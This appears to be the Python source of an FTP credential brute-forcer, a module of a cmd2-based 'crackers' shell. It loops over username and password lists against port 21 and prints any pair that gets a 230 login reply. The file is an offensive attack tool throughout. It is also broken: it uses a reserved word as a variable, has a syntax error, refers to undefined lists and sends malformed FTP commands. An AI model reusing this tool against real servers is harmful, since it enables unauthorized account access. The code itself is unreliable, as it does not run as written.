from cmd2 import Cmd
from colorama import Fore, Back, Style
import socket
import re
import sys


class Crackers(Cmd):
    intro = "Crackers and Brute forcers\n"
    prompt = "[" + Fore.YELLOW + "crack" + Style.RESET_ALL + "]>>> "

    def do_ftpcrack(self, line):
        "Cracks FTP creds (not subtle)"
        found = False
        HOST = line[0]

        # Should be a better way to do this
        # Check for return code on correct user, wrong pass
        for user in usernames:
            if found:
                break
            for pass in passwords:
                if found:
                    break
                attempt = ftp_connect(HOST, user, pass)
                if attempt == "230":
                    print("[*] Credentials found")
                    print(user + ":" + pass)
                    found = True

    def do_exit(self, line):
        "Exits back to main menu"
        return True

    def do_back(self, line):
        "Returns back to previous prompt"
        return True

    def do_EOF(self, line):
        "Exits the application"
        return True

    def postloop(self):
        "Exiting message"
        print("Exiting back to main menu...\n")

    def emptyline(self):
        "Does nothing on emptyline"
        pass

    def ftp_connect(HOST, user, pass):
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

        print("[*] Trying " + user ":" + pass)
        s.connect((HOST, 21))
        data = s.recv(1024)

        s.send('USER' + user + '\r\n')
        data = s.recv(1024)

        s.send('PASS' + pass + '\r\n')
        data = s.recv(3)

        s.send('QUIT\r\n')
        s.close()

        return data


def forExec():
    Crackers().cmdloop()
